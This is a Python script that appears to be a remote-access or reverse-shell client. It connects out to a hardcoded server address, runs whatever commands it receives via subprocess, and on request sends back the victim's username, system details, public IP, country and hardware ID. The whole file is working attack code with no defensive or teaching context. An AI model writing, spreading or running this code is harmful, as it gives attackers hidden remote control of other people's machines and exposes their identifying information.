import json
import socket
import subprocess
import os
import platform
import requests
SERVER_IP = "127.0.0.1"
SERVER_PORT = 9999
def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, SERVER_PORT))

    while True:
        command = client.recv(1024).decode()
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command.strip("cd "))
                client.send(b"Changed directory")
            except FileNotFoundError as e:
                client.send(f"Error: {str(e)}".encode())
        elif command == "getInfo":
            ip = requests.get("https://wtfismyip.com/text").text.strip()
            country = requests.get(f"https://ip-api.io/json/{ip}").json().get("countryName")
            client.send(json.dumps({"username": os.getlogin(), "system": platform.platform(), "ip": ip, "country": country, "hwid": subprocess.check_output("wmic csproduct get uuid").decode().split('\n')[1].strip()}).encode())
        elif command == "??":
            client.send(b"""
[1] exit - To close the Session
[2] cd - To change directory
[3] getInfo - To get informations like username, system, ip, country, hwid
""")
        else:
            output = subprocess.getoutput(command)
            if output:
                client.send(output.encode())
            else:
                client.send(b"Command executed successfully !")

    client.close()

if __name__ == "__main__":
    main()
